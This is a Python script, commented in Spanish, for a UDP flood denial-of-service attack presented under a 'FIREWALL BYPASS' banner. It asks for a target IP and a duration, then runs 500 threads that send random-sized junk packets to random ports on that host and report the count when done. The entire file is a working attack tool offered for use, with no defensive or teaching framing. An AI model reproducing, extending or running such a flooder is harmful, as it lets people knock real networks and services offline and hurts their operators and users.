import socket
import threading
import random
import time
import os

# Mostrar banner
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print("\033[91m")
    print(r"""
     █████  ██    ██ ██████     ██████  ██████  ███████ 
    ██   ██ ██    ██ ██   ██   ██    ██ ██   ██ ██      
    ███████ ██    ██ ██████    ██    ██ ██████  █████   
    ██   ██ ██    ██ ██   ██   ██    ██ ██   ██ ██      
    ██   ██  ██████  ██   ██    ██████  ██   ██ ███████ 

         ▓█▀▀█ ▒█▀▀█ ▒█▀▀█ ▀▀█▀▀ ▀█▀ ▒█▀▀█ ▒█░▒█
         ▒█▄▄█ ▒█▀▀▄ ▒█░░░ ░▒█░░ ▒█░ ▒█░░░ ▒█▀▀█
         ▒█░░░ ▒█▄▄█ ▒█▄▄█ ░▒█░░ ▄█▄ ▒█▄▄█ ▒█░▒█
    \033[97m        UDP PPS + Unconnected Ping | FIREWALL BYPASS
    \033[0m""")

# Método de ataque
def udp_pps_unconnected(ip, port, duration, threads=500):
    timeout = time.time() + duration
    total_sent = 0

    def flood():
        nonlocal total_sent
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        while time.time() < timeout:
            try:
                payload = random._urandom(random.randint(400, 1400))
                rand_port = random.randint(1, 65535)
                sock.sendto(payload, (ip, rand_port))  # "unconnected ping" usando puertos aleatorios
                total_sent += 1
            except:
                continue

    print(f"\n\033[94m[+] Lanzando UDP PPS + unconnected ping a {ip}:{port} durante {duration}s con {threads} hilos...\033[0m")

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(f"\033[92m[✓] Ataque finalizado. Paquetes enviados: {total_sent}\033[0m")

# Interfaz de entrada
def main():
    banner()
    ip = input("\033[97m[IP objetivo] > \033[0m")
    port = int(input("\033[97m[Puerto base] > \033[0m"))  # No se usará directamente, solo como base
    duration = int(input("\033[97m[Duración en segundos] > \033[0m"))
    
    udp_pps_unconnected(ip, port, duration)

if __name__ == "__main__":
    main()
